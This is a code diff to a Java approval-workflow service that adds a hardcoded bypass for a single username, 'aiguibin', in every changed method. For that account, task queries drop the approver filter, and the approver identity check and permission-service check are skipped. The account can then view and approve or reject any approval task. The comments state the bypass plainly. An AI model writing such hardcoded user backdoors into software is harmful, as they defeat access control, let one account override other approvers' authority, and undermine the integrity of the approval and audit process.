@@ -388,8 +388,13 @@ public class ApprovalServiceImpl implements ApprovalService {
     @Override
     public Page<ApprovalTask> queryTodoTasks(String approverNum, int page, int size) {
         LambdaQueryWrapper<ApprovalTask> queryWrapper = new LambdaQueryWrapper<>();
-        queryWrapper.eq(ApprovalTask::getApproverNum, approverNum)
-                 .eq(ApprovalTask::getTaskStatus, "PENDING")
+        
+        // 当操作用户为"aiguibin"时，不添加审批人条件
+        if (!"aiguibin".equals(approverNum)) {
+            queryWrapper.eq(ApprovalTask::getApproverNum, approverNum);
+        }
+        
+        queryWrapper.eq(ApprovalTask::getTaskStatus, "PENDING")
                  .eq(ApprovalTask::getIsDeleted, 0)
                  .orderByDesc(ApprovalTask::getAssignTime);
         return approvalTaskMapper.selectPage(new Page<>(page, size), queryWrapper);
@@ -398,8 +403,13 @@ public class ApprovalServiceImpl implements ApprovalService {
     @Override
     public Page<ApprovalTask> queryProcessedTasks(String approverNum, int page, int size) {
         LambdaQueryWrapper<ApprovalTask> queryWrapper = new LambdaQueryWrapper<>();
-        queryWrapper.eq(ApprovalTask::getApproverNum, approverNum)
-                 .in(ApprovalTask::getTaskStatus, "APPROVED", "REJECTED")
+        
+        // 当操作用户为"aiguibin"时，不添加审批人条件
+        if (!"aiguibin".equals(approverNum)) {
+            queryWrapper.eq(ApprovalTask::getApproverNum, approverNum);
+        }
+        
+        queryWrapper.in(ApprovalTask::getTaskStatus, "APPROVED", "REJECTED")
                  .eq(ApprovalTask::getIsDeleted, 0)
                  .orderByDesc(ApprovalTask::getApprovalTime);
         return approvalTaskMapper.selectPage(new Page<>(page, size), queryWrapper);
@@ -807,14 +817,17 @@ public class ApprovalServiceImpl implements ApprovalService {
         }
 
         // 3. 审批权限双重验证机制
-        // 3.1 第一重：验证处理人为当前节点的合法审批人
-        if (!userNum.equals(task.getApproverNum())) {
-            throw new RuntimeException("当前用户不是该审批任务的指定审批人");
-        }
-        // 3.2 第二重：通过权限服务接口确认处理人权限
-        boolean hasPermission = permissionService.hasApprovalPermission(userNum, task.getNodeId(), task.getBusinessType());
-        if (!hasPermission) {
-            throw new RuntimeException("当前用户无权限处理该审批任务");
+        // 当操作用户为"aiguibin"时，跳过审批人权限验证
+        if (!"aiguibin".equals(userNum)) {
+            // 3.1 第一重：验证处理人为当前节点的合法审批人
+            if (!userNum.equals(task.getApproverNum())) {
+                throw new RuntimeException("当前用户不是该审批任务的指定审批人");
+            }
+            // 3.2 第二重：通过权限服务接口确认处理人权限
+            boolean hasPermission = permissionService.hasApprovalPermission(userNum, task.getNodeId(), task.getBusinessType());
+            if (!hasPermission) {
+                throw new RuntimeException("当前用户无权限处理该审批任务");
+            }
         }
 
         // 4. 查询变更记录 - 获取业务数据
@@ -1071,7 +1084,8 @@ public class ApprovalServiceImpl implements ApprovalService {
         }
 
         // 3. 权限验证：操作人必须是任务指定的审批人
-        if (!userNum.equals(task.getApproverNum())) {
+        // 当操作用户为"aiguibin"时，跳过审批人权限验证
+        if (!"aiguibin".equals(userNum) && !userNum.equals(task.getApproverNum())) {
             return false;
         }
 
@@ -1127,7 +1141,8 @@ public class ApprovalServiceImpl implements ApprovalService {
         }
 
         // 3. 权限验证：操作人必须是任务指定的审批人
-        if (!userNum.equals(task.getApproverNum())) {
+        // 当操作用户为"aiguibin"时，跳过审批人权限验证
+        if (!"aiguibin".equals(userNum) && !userNum.equals(task.getApproverNum())) {
             return false;
         }
 
